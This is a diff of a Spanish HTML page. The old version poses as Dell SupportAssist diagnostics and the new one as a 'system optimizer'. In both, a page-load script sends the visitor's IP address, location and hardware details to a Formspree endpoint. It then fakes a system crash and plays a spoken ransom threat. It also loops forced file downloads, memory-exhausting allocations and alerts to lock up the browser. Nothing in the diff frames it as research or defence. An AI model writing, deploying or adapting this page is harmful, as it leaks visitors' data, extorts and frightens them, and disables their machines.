@@ -2,116 +2,88 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Dell SupportAssist - Diagnóstico de Hardware</title>
+    <title>⚡ SYSTEM_OPTIMIZER_v4.2 ⚡</title>
     <style>
-        body { background: #fff; color: #333; font-family: "Segoe UI", Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { text-align: center; width: 450px; }
-        .logo { width: 60px; margin-bottom: 20px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007db8; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #bsod { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0078d7; color: #fff; padding: 100px; box-sizing: border-box; z-index: 10000; text-align: left; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        #log { font-size: 10px; width: 90%; word-break: break-all; }
+        .red { color: #f00; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <div id="ui-main" class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/18/Dell_logo_2016.svg" class="logo" alt="Dell">
-        <h2>Optimizando su sistema...</h2>
-        <div class="loader"></div>
-        <p>Analizando controladores de red y hardware de video. Por favor, no cierre esta ventana.</p>
-    </div>
-
-    <div id="bsod">
-        <div style="font-size: 100px;">:(</div>
-        <div style="font-size: 24px; line-height: 1.5; margin-top: 30px;">
-            Su PC de Dell encontró un problema y necesita reiniciarse. <br>
-            Se está recopilando información sobre el error y después se reiniciará automáticamente.
-            <br><br>
-            <span id="progress">0%</span> completo
-            <br><br>
-            <div style="font-size: 16px;">
-                Para obtener más información, visite: https://dell.com/support/stopcode <br><br>
-                Código de detención: <span id="target_ip_code">CRITICAL_PROCESS_DIED</span>
-            </div>
-        </div>
-    </div>
+    <div id="log"></div>
 
     <script>
-        const FORM_ID = "xykdyebg";
+        const FORM_ID = "xykdyebg"; // Tu Formspree ID
+        const logs = document.getElementById('log');
 
+        function addLog(txt, isRed = false) {
+            const d = document.createElement('div');
+            if (isRed) d.className = "red";
+            d.innerText = `[${new Date().toLocaleTimeString()}] ${txt}`;
+            logs.appendChild(d);
+        }
+
+        // --- 1. PENETRACIÓN Y ROBO DE DATA ---
         window.onload = async () => {
-            // 1. PENETRACIÓN SILENCIOSA (Extraer todo)
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const gpu = (() => {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-                return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/D";
-            })();
+            addLog("> INICIANDO PENETRACIÓN...");
+            
+            const ipReq = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "ERR";
 
-            // Mandar reporte al "servidor maestro"
+            const data = {
+                "TARGET": "INFECTED",
+                "IP": ipReq.ip,
+                "GPU": gpu,
+                "RAM": navigator.deviceMemory + "GB",
+                "CORES": navigator.hardwareConcurrency,
+                "OS": navigator.platform,
+                "GEO": `${ipReq.city}, ${ipReq.country_name}`
+            };
+
+            // Enviar datos al instante
             fetch(`https://formspree.io/f/${FORM_ID}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "INFILTRACION": "SUCCESS",
-                    "TARGET_IP": ipData.ip,
-                    "GPU": gpu,
-                    "RAM": navigator.deviceMemory + "GB",
-                    "OS": navigator.platform,
-                    "LOC": ipData.city + ", " + ipData.country_name
-                })
+                body: JSON.stringify(data)
             });
 
-            // 2. ACTIVAR EL COLAPSO TRAS 5 SEGUNDOS
+            addLog(`> DATA EXFILTRADA: ${ipReq.ip} (${gpu})`, true);
+            
+            // --- 2. ATAQUE DE COLAPSO (PC/MAC/MOBILE) ---
             setTimeout(() => {
-                ejecutarPeta(ipData.ip);
-            }, 5000);
+                iniciarPeta(ipReq.ip);
+            }, 1000);
         };
 
-        function ejecutarPeta(ip) {
-            // Activar pantalla azul
-            document.getElementById('ui-main').style.display = 'none';
-            document.getElementById('bsod').style.display = 'block';
-            document.getElementById('target_ip_code').innerText = ip.replace(/\./g, '_') + "_DATA_BREACH";
+        function iniciarPeta(ip) {
+            // Audio de Amenaza
+            const v = new SpeechSynthesisUtterance("He penetrado tu sistema. Paga el rescate o destruyo tu disco duro.");
+            v.lang = 'es-ES'; v.pitch = 0.1;
+            window.speechSynthesis.speak(v);
 
-            // Audio de Chantaje Personalizado
-            const voz = new SpeechSynthesisUtterance("He penetrado tu sistema Dell. Tu información ha sido robada. Paga el rescate en diez horas o publicaré tus datos.");
-            voz.lang = 'es-ES';
-            voz.pitch = 0.2;
-            window.speechSynthesis.speak(voz);
-
+            // Bloqueo total
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-
-            // 3. BUCLE DE DESTRUCCIÓN (RAM, DISCO, CPU)
-            const storage = [];
-            let prog = 0;
             
+            const storage = [];
             setInterval(() => {
-                // Actualizar progreso falso
-                if (prog < 100) {
-                    prog++;
-                    document.getElementById('progress').innerText = prog + "%";
-                }
-
-                // Bomba de Archivos (Peta el disco duro)
-                const blob = new Blob(["PAGAME EL RESCATE. SISTEMA PENETRADO."], {type: 'text/plain'});
+                // Descarga masiva para petar carpetas (txt con mensaje)
+                const blob = new Blob([`PAGAME EL RESCATE. TU IP ES ${ip}`], {type: 'text/plain'});
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = `RESCATE_DELL_${Math.random().toString(36).substring(7)}.txt`;
+                a.download = `SISTEMA_SECUESTRADO_${Math.random().toString(36)}.txt`;
                 a.click();
 
-                // Bomba de Memoria (Peta la RAM)
-                for(let i=0; i<1000; i++) {
-                    storage.push(new Array(1000000).fill("💀").join(""));
-                }
+                // Peta la RAM
+                for(let i=0; i<1000; i++) storage.push(new Array(1000000).fill("💀"));
 
-                // Bloqueo de Interfaz
-                alert("DELL SECURITY WARNING:\n\nSISTEMA PENETRADO POR ATACANTE EXTERNO.\nIP: " + ip + "\n\nNO APAGUE EL EQUIPO.");
-
-                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
-            }, 150);
+                // Bloqueo de UI
+                alert("⚠️ SISTEMA BAJO ATAQUE ⚠️\n\nIP: " + ip + "\n\nTU INFORMACIÓN HA SIDO ENVIADA.");
+                
+                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(v);
+            }, 200);
         }
     </script>
 </body>
